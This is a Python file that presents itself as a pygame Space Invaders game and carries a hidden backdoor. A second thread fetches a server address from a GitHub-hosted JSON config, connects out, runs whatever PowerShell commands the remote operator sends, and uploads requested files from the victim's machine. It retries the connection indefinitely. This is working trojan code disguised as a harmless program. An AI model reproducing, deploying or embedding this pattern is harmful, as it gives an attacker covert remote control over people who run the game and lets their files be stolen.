import socket
import subprocess
import os
import pygame
import sys
import random
import time
import threading
import json
import urllib.request

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
FILE_IDENTIFIER = "<END_OF_FILE>"

# ── Space Invaders config ────────────────────────────────
WIDTH, HEIGHT = 480, 640
FPS = 60
BLACK  = (0,   0,   0)
WHITE  = (255, 255, 255)
GREEN  = (0,   255, 70)
RED    = (220, 30,  30)
YELLOW = (255, 230, 0)
CYAN   = (0,   220, 255)
GRAY   = (60,  60,  60)

PLAYER_SPEED   = 5
BULLET_SPEED   = 7
ALIEN_ROWS     = 4
ALIEN_COLS     = 10
ALIEN_SPEED    = 1
ALIEN_DROP     = 20
SHOOT_COOLDOWN = 25

pygame.init()
font_big   = pygame.font.SysFont("Consolas", 36, bold=True)
font_mid   = pygame.font.SysFont("Consolas", 24)
font_small = pygame.font.SysFont("Consolas", 18)

# ── Socket helpers ───────────────────────────────────────
def send_file(file_path, guest_socket):
    try:
        with open(file_path, "rb") as file:
            while chunk := file.read(1024):
                guest_socket.sendall(chunk)
        guest_socket.sendall(FILE_IDENTIFIER.encode())
    except FileNotFoundError:
        guest_socket.sendall(f"File not found: {file_path}".encode() + IDENTIFIER.encode())
    except Exception as e:
        guest_socket.sendall(f"Error transferring file: {e}".encode() + IDENTIFIER.encode())

def handle_download(command, guest_socket):
    file_path = command[9:].strip()
    send_file(file_path, guest_socket)

def handle_upload(command, guest_socket):
    file_path = command[7:].strip()
    if not file_path:
        guest_socket.sendall(f"No file specified for upload.{IDENTIFIER}".encode())
        return
    send_file(file_path, guest_socket)

def execute_command(command, guest_socket):
    try:
        output = subprocess.run(
            ["powershell.exe", command], capture_output=True, text=True
        )
        if output.returncode == 0:
            result = output.stdout.strip() + IDENTIFIER
        else:
            result = output.stderr.strip() + IDENTIFIER
    except Exception as e:
        result = f"Error executing command: {e}" + IDENTIFIER
    guest_socket.sendall(result.encode())

def handle_cd(command, guest_socket):
    path_to_change = command[3:].strip()
    try:
        os.chdir(path_to_change)
        result = f"Changed directory to: {os.getcwd()}" + IDENTIFIER
    except FileNotFoundError:
        result = f"Directory not found: {path_to_change}" + IDENTIFIER
    except Exception as e:
        result = f"Error changing directory: {e}" + IDENTIFIER
    guest_socket.sendall(result.encode())

# ── Game classes ─────────────────────────────────────────
class Alien:
    SIZE = 32
    def __init__(self, x, y, row):
        self.x, self.y, self.row, self.alive = x, y, row, True

    def draw(self, screen):
        if not self.alive:
            return
        color = [CYAN, GREEN, GREEN, YELLOW][self.row % 4]
        x, y, s = int(self.x), int(self.y), self.SIZE
        pygame.draw.rect(screen, color, (x+6, y+4, s-12, s-8), border_radius=4)
        pygame.draw.rect(screen, BLACK, (x+9,  y+9, 5, 5))
        pygame.draw.rect(screen, BLACK, (x+18, y+9, 5, 5))
        pygame.draw.rect(screen, color, (x+4,  y+22, 5, 7))
        pygame.draw.rect(screen, color, (x+23, y+22, 5, 7))
        pygame.draw.line(screen, color, (x+10, y+4), (x+6,  y), 2)
        pygame.draw.line(screen, color, (x+22, y+4), (x+26, y), 2)

    def rect(self):
        return pygame.Rect(self.x+4, self.y+4, self.SIZE-8, self.SIZE-8)


class Player:
    W, H = 44, 20
    def __init__(self):
        self.x = WIDTH // 2 - self.W // 2
        self.y = HEIGHT - 60
        self.cooldown = 0

    def move(self, keys):
        if keys[pygame.K_LEFT]  and self.x > 0:           self.x -= PLAYER_SPEED
        if keys[pygame.K_RIGHT] and self.x < WIDTH-self.W: self.x += PLAYER_SPEED

    def draw(self, screen):
        x, y = int(self.x), int(self.y)
        pygame.draw.rect(screen, GREEN, (x, y+8, self.W, self.H-8), border_radius=4)
        pygame.draw.rect(screen, CYAN,  (x+16, y, 12, 12), border_radius=6)

    def shoot(self):
        if self.cooldown == 0:
            self.cooldown = SHOOT_COOLDOWN
            return Bullet(self.x + self.W//2 - 2, self.y, -BULLET_SPEED)
        return None

    def rect(self):
        return pygame.Rect(self.x, self.y+8, self.W, self.H)

    def tick(self):
        if self.cooldown > 0: self.cooldown -= 1


class Bullet:
    def __init__(self, x, y, vy, color=WHITE):
        self.x, self.y, self.vy, self.color = x, y, vy, color

    def update(self): self.y += self.vy

    def draw(self, screen):
        pygame.draw.rect(screen, self.color, (int(self.x), int(self.y), 4, 12), border_radius=2)

    def rect(self): return pygame.Rect(self.x, self.y, 4, 12)
    def off_screen(self): return self.y < -20 or self.y > HEIGHT + 20


class AlienBullet(Bullet):
    def __init__(self, x, y):
        super().__init__(x, y, BULLET_SPEED - 1, RED)


class Shield:
    BLOCK = 8
    def __init__(self, cx, y):
        self.blocks = set()
        for r in range(4):
            for c in range(6):
                if not (r == 0 and c in (0, 5)):
                    self.blocks.add((cx - 3*self.BLOCK + c*self.BLOCK, y + r*self.BLOCK))

    def draw(self, screen):
        for (x, y) in self.blocks:
            pygame.draw.rect(screen, (0, 180, 0), (x, y, self.BLOCK, self.BLOCK))

    def hit(self, rect):
        for (x, y) in list(self.blocks):
            if rect.colliderect(pygame.Rect(x, y, self.BLOCK, self.BLOCK)):
                self.blocks.discard((x, y))
                return True
        return False

# ── Game helpers ─────────────────────────────────────────
def _draw_btn(screen, text, rect, color):
    pygame.draw.rect(screen, color, rect, border_radius=8)
    pygame.draw.rect(screen, WHITE, rect, 2, border_radius=8)
    t = font_mid.render(text, True, WHITE)
    screen.blit(t, (rect[0]+(rect[2]-t.get_width())//2, rect[1]+(rect[3]-t.get_height())//2))

def _clicked(pos, rect): return pygame.Rect(rect).collidepoint(pos)

def build_aliens():
    ox = (WIDTH - ALIEN_COLS * 44) // 2
    return [Alien(ox+c*44, 60+r*44, r) for r in range(ALIEN_ROWS) for c in range(ALIEN_COLS)]

def build_shields():
    return [Shield(p, HEIGHT-130) for p in [WIDTH//5, 2*WIDTH//5, 3*WIDTH//5, 4*WIDTH//5]]

def show_game_over(screen, score, win):
    btn_retry = pygame.Rect(WIDTH//2-100, HEIGHT//2+40,  200, 48)
    btn_quit  = pygame.Rect(WIDTH//2-100, HEIGHT//2+100, 200, 48)
    while True:
        screen.fill(BLACK)
        title = "YOU WIN!" if win else "GAME OVER"
        t = font_big.render(title, True, GREEN if win else RED)
        screen.blit(t, (WIDTH//2-t.get_width()//2, HEIGHT//3))
        s = font_mid.render(f"Score: {score}", True, WHITE)
        screen.blit(s, (WIDTH//2-s.get_width()//2, HEIGHT//3+55))
        _draw_btn(screen, "RETRY", btn_retry, (0,130,0))
        _draw_btn(screen, "QUIT",  btn_quit,  (160,0,0))
        pygame.display.flip()
        for event in pygame.event.get():
            if event.type == pygame.QUIT:   return False
            if event.type == pygame.MOUSEBUTTONDOWN:
                if _clicked(event.pos, btn_retry): return True
                if _clicked(event.pos, btn_quit):  return False

def run_game(screen, clock):
    player  = Player()
    aliens  = build_aliens()
    shields = build_shields()
    bullets, a_bullets = [], []
    score, lives = 0, 3
    alien_dx = ALIEN_SPEED
    a_timer, a_interval = 0, 90

    while True:
        clock.tick(FPS)
        keys = pygame.key.get_pressed()
        for event in pygame.event.get():
            if event.type == pygame.QUIT: return False
            if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                b = player.shoot()
                if b: bullets.append(b)

        player.move(keys); player.tick()
        for b in bullets: b.update()
        for b in a_bullets: b.update()
        bullets   = [b for b in bullets   if not b.off_screen()]
        a_bullets = [b for b in a_bullets if not b.off_screen()]

        alive = [a for a in aliens if a.alive]
        if not alive:
            return show_game_over(screen, score, win=True)

        edge = any(a.x <= 0 or a.x + Alien.SIZE >= WIDTH for a in alive)
        for a in alive: a.x += alien_dx
        if edge:
            alien_dx *= -1
            for a in alive: a.y += ALIEN_DROP; a.x += alien_dx

        a_timer += 1
        if a_timer >= a_interval:
            a_timer = 0
            sh = random.choice(alive)
            a_bullets.append(AlienBullet(sh.x + Alien.SIZE//2 - 2, sh.y + Alien.SIZE))
            a_interval = max(30, 90 - (ALIEN_ROWS*ALIEN_COLS - len(alive)) * 2)

        for b in bullets[:]:
            for a in alive:
                if b.rect().colliderect(a.rect()):
                    a.alive = False
                    if b in bullets: bullets.remove(b)
                    score += (ALIEN_ROWS - a.row) * 10
                    break

        for b in bullets[:]:
            for s in shields:
                if s.hit(b.rect()) and b in bullets: bullets.remove(b); break

        for b in a_bullets[:]:
            for s in shields:
                if s.hit(b.rect()) and b in a_bullets: a_bullets.remove(b); break

        for b in a_bullets[:]:
            if b.rect().colliderect(player.rect()):
                a_bullets.remove(b); lives -= 1
                if lives <= 0:
                    return show_game_over(screen, score, win=False)

        if any(a.y + Alien.SIZE >= player.y for a in alive):
            return show_game_over(screen, score, win=False)

        screen.fill(BLACK)
        random.seed(42)
        for _ in range(60): screen.set_at((random.randint(0,WIDTH), random.randint(0,HEIGHT)), GRAY)
        random.seed()
        for s in shields:  s.draw(screen)
        for a in aliens:   a.draw(screen)
        for b in bullets:  b.draw(screen)
        for b in a_bullets:b.draw(screen)
        player.draw(screen)

        screen.blit(font_mid.render(f"SCORE: {score}", True, WHITE), (10, 10))
        lt = font_mid.render(f"LIVES: {'♥ '*lives}", True, RED)
        screen.blit(lt, (WIDTH - lt.get_width() - 10, 10))
        ct = font_small.render("← → MOVE   SPACE SHOOT", True, GRAY)
        screen.blit(ct, (WIDTH//2 - ct.get_width()//2, HEIGHT-22))
        pygame.display.flip()

def main_game():
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Space Invaders")
    clock = pygame.time.Clock()
    while True:
        result = run_game(screen, clock)
        if not result:
            return False

def server_connection(server_IP, server_port):
    server_address = (server_IP, server_port)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as guest_socket:
            guest_socket.connect(server_address)
            print("Connected to server.")

            json_url = "https://raw.githubusercontent.com/bagas77vs/socket-control-python/main/client3.json"
            response = urllib.request.urlopen(json_url)
            config_data = json.loads(response.read())

            print("Fetched JSON config from GitHub:", config_data)

            while True:
                command = guest_socket.recv(1024).decode('utf-8', errors='ignore')
                if not command:
                    break

                if command.startswith("cd "):
                    handle_cd(command, guest_socket)
                elif command.startswith("getfile "):
                    handle_download(command, guest_socket)
                elif command.startswith("upload "):
                    handle_upload(command, guest_socket)
                else:
                    execute_command(command, guest_socket)
    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(5)
        print("Retrying connection...")

if __name__ == "__main__":
    while True:
        try:
            game_thread = threading.Thread(target=main_game)
            game_thread.start()

            json_url = "https://raw.githubusercontent.com/bagas77vs/socket-control-python/main/client3.json"
            response = urllib.request.urlopen(json_url)
            config_data = json.loads(response.read())

            server_IP = config_data['server']['ip']
            server_port = config_data['server']['port']

            print(f"Connecting to server at {server_IP}:{server_port}...")
            server_thread = threading.Thread(target=server_connection, args=(server_IP, server_port))
            server_thread.start()
            server_thread.join()

        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(5)
            print("Retrying...")
